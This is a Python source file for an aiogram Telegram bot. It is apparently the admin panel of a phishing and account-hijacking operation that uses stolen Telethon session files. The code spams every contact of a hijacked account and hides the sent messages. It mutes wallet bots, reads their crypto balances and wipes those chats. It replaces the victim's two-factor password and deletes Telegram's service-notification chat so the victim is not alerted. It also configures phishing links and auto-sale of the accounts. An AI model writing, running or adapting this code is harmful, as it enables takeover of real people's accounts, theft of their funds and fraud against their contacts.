import asyncio
import os

import aiogram
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Text
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup,Message,CallbackQuery,ParseMode
from aiogram.utils.callback_data import CallbackData
from aiogram import Bot, Dispatcher, executor, types
from telethon import TelegramClient, functions

from config import config,edit_config

class get_text(StatesGroup):
    text = State()
    bot_text = State()
    bot_link = State()
API_TOKEN = config('ADMIN_BOT') # bot token

bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

def gen_msg():
    text = f'''
<b>💰 Автопродажа: </b>{'Вкл' if config('lolz')=='1' else 'Выкл'}

<b>🧬 Прокси: </b>{'Вкл' if config('proxy')=='1' else 'Выкл'}

<b>🔮 Шаблон: </b>{config('templ')}

<b>💌 Текст рассылки: </b>{config('SPAM_MSG')}

<b>📝 Фишинг приветствие: </b><i>{config('USER_MSG')}</i>
<b>🌐 Фишинг ссылка: </b><i>{config('USER_LINK')}</i>
    '''
    return text
def gen_kb():
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton(text='❌ Выключить автопродажу',callback_data='asell*off') if config('lolz') == '1' else InlineKeyboardButton(text='✅ Включить автопродажу',callback_data='asell*on'))
    kb.add(InlineKeyboardButton(text='❌ Выключить прокси',callback_data='proxy*off') if config('proxy') == '1' else InlineKeyboardButton(text='✅ Включить прокси',callback_data='proxy*on'))
    kb.add(InlineKeyboardButton(text='🔮 Изменить шаблон',callback_data='templ'))
    kb.add(InlineKeyboardButton(text='💌 Изменить текст рассылки',callback_data='spam_text_chg'))
    kb.add(InlineKeyboardButton(text='📝 Изменить фишинг приветствие',callback_data='user_text_chg'))
    kb.add(InlineKeyboardButton(text='🌐 Изменить фишинг ссылку',callback_data='user_link_chg'))
    return kb
def get_templs():
    kb = InlineKeyboardMarkup()
    templs_list = os.listdir('templates')
    for templ in templs_list:
        kb.add(InlineKeyboardButton(text=templ, callback_data=f'set_templ*{templ}'))
    return kb
@dp.message_handler(commands='cancel',state='*')
async def cancel(msg:Message,state:FSMContext):
    await state.finish()
    await msg.bot.delete_message(msg.chat.id, msg.message_id - 1)
    await msg.delete()
    await msg.answer(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="user_link_chg"))
async def lb_spam_text(call:CallbackQuery):
    await call.message.edit_text('Введи новую ссылку либо /cancel для отмены:')
    await get_text.bot_link.set()
@dp.message_handler(state=get_text.bot_link)
async def set_spam_text(msg:Message,state:FSMContext):
    await state.finish()
    edit_config('user_link',msg.text)
    await msg.bot.delete_message(msg.chat.id,msg.message_id-1)
    await msg.delete()
    await msg.answer(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="user_text_chg"))
async def lb_spam_text(call:CallbackQuery):
    await call.message.edit_text('Введи новое сообщение либо /cancel для отмены:')
    await get_text.bot_text.set()
@dp.message_handler(state=get_text.bot_text)
async def set_spam_text(msg:Message,state:FSMContext):
    await state.finish()
    edit_config('user_msg',msg.text)
    await msg.bot.delete_message(msg.chat.id,msg.message_id-1)
    await msg.delete()
    await msg.answer(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="spam_text_chg"))
async def lb_spam_text(call:CallbackQuery):
    await call.message.edit_text('Введи новый текст рассылки либо /cancel для отмены:')
    await get_text.text.set()
@dp.message_handler(state=get_text.text)
async def set_spam_text(msg:Message,state:FSMContext):
    await state.finish()
    edit_config('spam_msg',msg.text)
    await msg.bot.delete_message(msg.chat.id,msg.message_id-1)
    await msg.delete()
    await msg.answer(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.message_handler(commands='settings')
async def settings(message:Message):
    await message.answer(gen_msg(),parse_mode=ParseMode.HTML,reply_markup=gen_kb())

@dp.callback_query_handler(Text(startswith="asell"))
async def autosell_toggle(call:CallbackQuery):
    if call.data.split('*')[1]== 'on':
            edit_config('lolz','1')
    elif call.data.split('*')[1]=='off':
            edit_config('lolz', '0')
    await call.message.edit_text(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="proxy"))
async def proxy_toggle(call:CallbackQuery):
    if call.data.split('*')[1]== 'on':
            edit_config('proxy','1')
    elif call.data.split('*')[1]=='off':
            edit_config('proxy', '0')
    await call.message.edit_text(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="templ"))
async def choise_templ(call:CallbackQuery):
    await call.message.edit_text('Выберите шаблон: ',reply_markup=get_templs())
@dp.callback_query_handler(Text(startswith="set_templ"))
async def set_templ(call:CallbackQuery):
    edit_config('templ',call.data.split('*')[1])
    await call.message.edit_text(gen_msg(), parse_mode=ParseMode.HTML, reply_markup=gen_kb())
@dp.callback_query_handler(Text(startswith="spam"))
async def spam(call:CallbackQuery):
    await call.answer('Началась рассылка ⌚')
    session = 'sessions/'+call.data.split('*')[1]+'.session'
    client = TelegramClient(session, int(config('API_ID')),config('API_HASH'))
    await client.connect()
    dialogs = client.iter_dialogs()
    async for dialog in dialogs:

        try:
            if dialog.entity.bot:
                continue
            msg_obj = await client.send_message(dialog,config('SPAM_MSG'))
            await client.delete_messages(dialog,msg_obj.id,revoke=False)
        except:
            continue
    await client.disconnect()
async def mute(client:TelegramClient,tg_dialog):
    MUTE_CHAT_RIGHTS = {
        "send_messages": False,
        "send_media": False,
        "send_stickers": False,
        "send_gifs": False,
        "send_games": False,
        "send_inline": False,
        "send_polls": False,
    }
    try:
        await client.edit_permissions(tg_dialog, **MUTE_CHAT_RIGHTS)
    except:
        pass
@dp.callback_query_handler(Text(startswith='crypto'))
async def crypto(call:CallbackQuery):
    print(call.data)
    session = 'sessions/' + call.data.split('*')[1] + '.session'
    client = TelegramClient(session, int(config('API_ID')), config('API_HASH'))
    await client.connect()
    crypto = ''
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            if dialog.entity.bot:
                if dialog.entity.username == "wallet":
                    await mute(client,dialog)
                    await dialog.send_message('/start')
                    await dialog.send_message('/wallet')
                    await asyncio.sleep(1)
                    await client.send_read_acknowledge(dialog)
                    msg = await client.get_messages(dialog.entity)
                    if msg[0].text == '/wallet':
                        await asyncio.sleep(1)
                        await client.send_read_acknowledge(dialog)
                        msg = await client.get_messages(dialog.entity)
                    await client(functions.messages.DeleteHistoryRequest(dialog, 9999999, just_clear=True))
                    crypto += '\n========== @walet ===========\n' + msg[0].text
                if dialog.entity.username == "CryptoBot":
                    await mute(client, dialog)
                    await dialog.send_message('/start')
                    await dialog.send_message('/wallet')
                    await asyncio.sleep(1)
                    await client.send_read_acknowledge(dialog)
                    msg = await client.get_messages(dialog.entity)
                    if msg[0].text == '/wallet':
                        await asyncio.sleep(1)
                        await client.send_read_acknowledge(dialog)
                        msg = await client.get_messages(dialog.entity)
                    await client(functions.messages.DeleteHistoryRequest(dialog, 9999999, just_clear=True))
                    crypto += '\n========== @CryptoBot ===========\n' + msg[0].text
    if crypto:
        keyboard = aiogram.types.InlineKeyboardMarkup()
        keyboard.add(
            aiogram.types.InlineKeyboardButton(text='🤑 Проверить крипту', callback_data=f'crypto*{session}'))
        keyboard.add(aiogram.types.InlineKeyboardButton(text='📨 Спам', callback_data=f'spam*{session}'))
        await call.message.edit_caption(call.message.caption+crypto,parse_mode=aiogram.types.ParseMode.MARKDOWN,reply_markup=keyboard)
        await call.answer('')
    else:
        await call.answer('Кошельки не найдены')
    print(call.message.text)
    await client.disconnect()
@dp.callback_query_handler(Text(startswith='2fa'))
async def tfa(call:aiogram.types.CallbackQuery):
    session = 'sessions/' + call.data.split('*')[1] + '.session'
    password = call.data.split('*')[2]
    client = TelegramClient(session, int(config('API_ID')), config('API_HASH'))
    await client.edit_2fa(current_password=password, new_password=config('NEW_PASS'), hint=config('NEW_HINT'))
    await client.delete_dialog(777000)
    await client.disconnect()
@dp.callback_query_handler(Text(startswith='check'))
async def check_valid(call:aiogram.types.CallbackQuery):
    session = 'sessions/' + call.data.split('*')[1] + '.session'
    client = TelegramClient(session, int(config('API_ID')), config('API_HASH'))
    try:
        await client.connect()
        if await client.get_me():
            await call.answer('✅ Валид')
        else:
            await call.answer('❌ Не валид')
    except Exception as e:
        await call.answer(f'Ошибка: {e}')
    await client.disconnect()
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)